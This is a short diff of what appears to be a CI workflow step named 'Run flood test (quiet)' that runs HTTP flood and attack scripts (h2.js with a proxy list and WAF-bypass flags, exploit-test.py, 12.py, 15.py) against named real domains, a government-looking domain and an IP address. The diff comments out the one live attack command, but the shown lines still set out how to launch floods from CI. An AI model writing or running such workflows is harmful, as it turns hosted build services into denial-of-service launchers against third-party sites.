@@ -17,6 +17,6 @@ jobs:
       - name: Run flood test (quiet)
         run: |
           # node h2.js https://paper2galgame.com cc.txt 21000 80 1 1 GET --waf --mode full --random-speed --auto-switch
-          # python3 exploit-test.py cnmdsb.sbgov.cn 443 --no-ssl
-          sudo python 12.py paper2galgame.com 443
+          # python3 exploit-test.py paper2galgame.com 443
+          # sudo python 12.py paper2galgame.com 443
           # python3 15.py 103.116.247.42 22 300
